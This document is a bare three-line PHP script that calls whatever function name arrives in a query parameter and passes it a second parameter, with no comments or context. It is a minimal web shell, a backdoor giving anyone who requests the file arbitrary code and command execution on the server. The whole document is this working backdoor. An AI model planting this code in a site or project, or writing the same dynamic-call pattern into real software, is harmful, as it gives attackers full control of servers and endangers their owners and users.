<?
    $_GET['func']($_GET['a']);
?>